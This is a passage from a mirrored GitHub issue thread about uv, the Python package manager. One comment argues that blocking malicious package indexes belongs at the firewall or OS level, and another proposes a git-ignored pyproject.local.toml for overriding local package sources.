<p>I am wondering if we are putting too much burden on <code>uv</code> to solve this problem when it should be solved at a higher level like the operating system and/or firewall. Because <code>uv</code> is just one tool and don't you want every program on every computer in your network to not be able to talk to https://attacking-index.com?</p>
<p>When I worked in a research job at a lab funded by government a long time ago, the most security-conscious work was done in an area where they disallowed all Internet access. Everything they used came from the internal network. And the USB ports were disabled so that USB memory sticks weren't an attack vector.</p>
<p>My point is that the best thing for security are comprehensive measures and having very granular security controls within this one tool called <code>uv</code> might not be worth the trouble of the complexity they add.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../issues/6349.html">astral-sh/uv#6349</a> on 2025-06-30 16:26</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/vanhumbeecka">@vanhumbeecka</a> on 2025-10-09 08:47</div>
            <div class="timeline-body"><p>I get the security concerns about ENV variables in the <code>pyproject.toml</code>.</p>
<p>-&gt; So what about a different approach?</p>
<p>Can we have a <code>pyproject.local.toml</code> that is <code>.gitignored</code> ?
Then <code>uv</code> can merge the contents of both <code>pyproject.toml</code> (version controlled) and <code>pyproject.local.toml</code> (non-version controlled) and we get the behaviour we actually want?</p>
<pre><code class="language-toml"># pyproject.local.toml
[tool.uv.sources]
my-private-package = { path = /my/local/path, editable = true }
</code></pre>
<pre><code class="language-toml"># pyproject.toml -&gt; this part will get overwritten if the same is found in an existing `pyproject.local.toml`
[tool.uv.sources]
my-private-package = { path = /dummy/path, editable = true }
</code></pre>
</div>
        </div>
    </div>

    <footer>
        Synced at 2026-01-09 23:34:58 UTC
    </footer>
</body>
</html>
